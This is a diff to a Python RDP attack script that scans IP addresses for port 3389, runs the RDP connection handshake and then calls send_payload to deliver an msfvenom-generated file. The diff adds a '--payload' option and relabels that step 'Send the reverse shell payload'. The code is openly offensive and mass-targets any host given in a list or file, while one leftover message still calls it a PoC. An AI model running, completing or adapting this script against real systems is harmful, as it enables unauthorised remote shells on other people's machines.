@@ -18,7 +18,6 @@ class TPKT(Structure):
         ('TPDU', ':=""'),
     )
 
-
 class TPDU(Structure):
     commonHdr = (
         ('LengthIndicator', 'B=len(VariablePart)+1'),
@@ -30,7 +29,6 @@ class TPDU(Structure):
         Structure.__init__(self, data)
         self['VariablePart'] = ''
 
-
 class CR_TPDU(Structure):
     commonHdr = (
         ('DST-REF', '<H=0'),
@@ -40,7 +38,6 @@ class CR_TPDU(Structure):
         ('Flags', 'B=0'),
         ('Length', '<H=8'),
     )
-
 
 class DATA_TPDU(Structure):
     commonHdr = (
@@ -52,7 +49,6 @@ class DATA_TPDU(Structure):
         Structure.__init__(self, data)
         self['UserData'] = ''
 
-
 class RDP_NEG_REQ(CR_TPDU):
     structure = (
         ('requestedProtocols', '<L'),
@@ -62,7 +58,6 @@ class RDP_NEG_REQ(CR_TPDU):
         CR_TPDU.__init__(self, data)
         if data is None:
             self['Type'] = 1
-
 
 # packing and unpacking binary data
 class Packer(object):
@@ -75,7 +70,6 @@ class Packer(object):
 
     def bin_pack(self):
         return binascii.hexlify(self.packet)
-
 
 # PDU control sequence
 class DoPduConnectionSequence(object):
@@ -135,7 +129,6 @@ class DoPduConnectionSequence(object):
             pdu_channels.append(Packer(current_channel).bin_unpack())
         return pdu_channels
 
-
 class Parser(argparse.ArgumentParser):
 
     def __init__(self):
@@ -156,8 +149,11 @@ class Parser(argparse.ArgumentParser):
             "-f", "--file", dest="ipAddyFile", metavar="FILE", default=None,
             help="provide a file containing IP addresses, one per line"
         )
+        parser.add_argument(
+            "--payload", dest="payload", metavar="PAYLOAD", default="./payload.bin",
+            help="specify the msfvenom payload file"
+        )
         return parser.parse_args()
-
 
 # constants
 GIS_RDP = []
@@ -166,7 +162,6 @@ TYPE_RDP_NEG_REQ = 1
 PROTOCOL_SSL = 1
 SENT = "\033[91m -->\033[0m"
 RECEIVE = "\033[94m<-- \033[0m"
-
 
 def info(string):
     print("[ \033[32m+\033[0m ] {}".format(string))
@@ -188,7 +183,6 @@ def send_payload(tls, payload_path):
 def error(string):
     print("[ \033[31m!\033[0m ] {}".format(string))
 
-
 # connect the sockets and return the received data plus the connection in a Tuple
 def socket_connection(obj, address, port=3389, receive_size=4000):
     try:
@@ -199,7 +193,6 @@ def socket_connection(obj, address, port=3389, receive_size=4000):
     except Exception as e:
         error(e)
         return None
-
 
 # check if the ip is running RDP or not
 def check_rdp_service(address, port=3389):
@@ -218,9 +211,8 @@ def check_rdp_service(address, port=3389):
     else:
         error("unable to connect")
 
-
 # start the connection like a boss
-def start_rdp_connection(ip_addresses, port=3389):
+def start_rdp_connection(ip_addresses, port=3389, payload_path="./payload.bin"):
     tpkt = TPKT()
     tpdu = TPDU()
     rdp_neg = RDP_NEG_REQ()
@@ -263,8 +255,7 @@ def start_rdp_connection(ip_addresses, port=3389):
                     RECEIVE, hex(len(returned_packet)), channel_number, ip
                 ))
 
-            # Continue with further steps if needed (Security Exchange, Info, etc.)
-            payload_path = "./payload.bin"  # Assurez-vous que le payload est généré avec msfvenom
+            # Send the reverse shell payload
             send_payload(tls, payload_path)
 
             info("closing the connection now, this is a PoC not a working exploit")
@@ -273,11 +264,11 @@ def start_rdp_connection(ip_addresses, port=3389):
             error("unable to connect: {}".format(e))
             continue
 
-
 def main():
     to_scan = []
     opt = Parser().optparse()
     port = opt.targetPort
+    payload_path = opt.payload  # Retrieve the payload path from the argument
     if opt.ipAddyList is not None:
         for ip in opt.ipAddyList.split(","):
             to_scan.append(ip)
@@ -298,8 +289,7 @@ def main():
         check_rdp_service(scan, port)
     info("starting RDP connection on {} targets".format(len(GIS_RDP)))
     print("\n")
-    start_rdp_connection(GIS_RDP, port)
-
+    start_rdp_connection(GIS_RDP, port, payload_path)
 
 if __name__ == "__main__":
     try:
